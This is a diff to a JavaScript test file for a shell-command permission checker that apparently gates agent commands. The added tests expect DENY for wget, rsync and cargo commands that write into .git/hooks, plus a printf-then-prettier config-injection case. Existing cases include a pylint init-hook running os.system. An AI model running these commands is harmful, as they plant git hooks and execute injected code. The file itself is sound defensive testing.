@@ -628,7 +628,8 @@ test('a bounded runner or compiler is bounded only while its options name nothin
     'prettier --plugin ./pl.js a.js',
     'prettier --plugin=./pl.js a.js',
     'prettier --config ./cfg.cjs a.js',
-    'prettier --config missing.json a.js',
+    // a configuration an earlier unit of the same line writes is read as what it will be, not as the absence it is now
+    'printf \'{"plugins":["./pl.js"]}\' > fresh.json && prettier --config fresh.json a.js',
     "pylint --init-hook \"import os; os.system('git push origin main')\" x.py",
     'pylint --init-hook="import os" x.py',
     'pylint --load-plugins=evil x.py',
@@ -656,6 +657,8 @@ test('a bounded runner or compiler is bounded only while its options name nothin
     'prettier --check .',
     'prettier --config .prettierrc a.js',
     'prettier --config plain.json a.js',
+    // a configuration that is not there is nothing for the tool to load
+    'prettier --config missing.json a.js',
     'prettier a.js',
     'pylint x.py',
     'pylint --load-plugins=pylint_django x.py',
@@ -671,4 +674,40 @@ test('a bounded runner or compiler is bounded only while its options name nothin
   // a module that is NOT beside the command is the standard library's
   assert.equal(verdict('python3 -m venv .venv', workspace()), 'ALLOW');
   assert.equal(verdict('python3 -m venv .venv', workspace({ venv: '' })), 'ALLOW');
+});
+
+test('RC-WRT: wget, rsync and cargo name more than one file to write, and name it by any unique prefix of a long option', () => {
+  const dir = workspace({ 'Cargo.toml': '[package]\nname = "a"\n', 'src/a': 'x' });
+  for (const c of [
+    'wget -O .git/hooks/pre-commit https://example.test/x',
+    'wget -O.git/hooks/pre-commit https://example.test/x',
+    'wget --output-doc=.git/hooks/pre-commit https://example.test/x',
+    'wget -P .git/hooks https://example.test/pre-commit',
+    'wget -P.git/hooks https://example.test/pre-commit',
+    'wget --directory=.git/hooks https://example.test/pre-commit',
+    'wget --directory-prefix=.git/hooks https://example.test/pre-commit',
+    'wget -o .git/hooks/x https://example.test/x',
+    'wget -a .git/hooks/x https://example.test/x',
+    'wget --save-cookies=.git/hooks/x https://example.test/x',
+    'rsync -a src/ .git/hooks/',
+    'rsync --log-file=.git/hooks/x -a src/ dst/',
+    'rsync --backup-dir=.git/hooks -a src/ dst/',
+    'rsync --write-batch=.git/hooks/x -a src/ dst/',
+    'rsync -a --write-b=.git/hooks/x src/ dst/',
+    'rsync -a --tem=.git/hooks src/ dst/',
+    'rsync -a -T .git/hooks src/ dst/',
+    'cargo build --target-dir=.git/hooks',
+    'cargo build --target-dir .git/hooks',
+    'cargo build --target-d=.git/hooks',
+    'cargo build --artifact-dir .git/hooks',
+    'cargo build -Zunstable-options --out-dir .git/hooks',
+    'cargo install --root=.git/hooks foo',
+    'cargo +nightly build --target-dir=.git/hooks',
+  ])
+    assert.equal(verdict(c, dir), 'DENY', c);
+  // ...and the same options aimed at an ordinary place are the work they are for
+  for (const c of ['cargo build --target-dir target', 'cargo build --manifest-path Cargo.toml', 'cargo build -j 4 --release', 'rsync -a src/ dst/ --dry-run'])
+    assert.notEqual(verdict(c, dir), 'DENY', c);
+  assert.equal(verdict('cargo build --target-dir target', dir), 'ALLOW');
+  assert.equal(verdict('wget -qO- https://example.test/x', dir), 'ASK');
 });
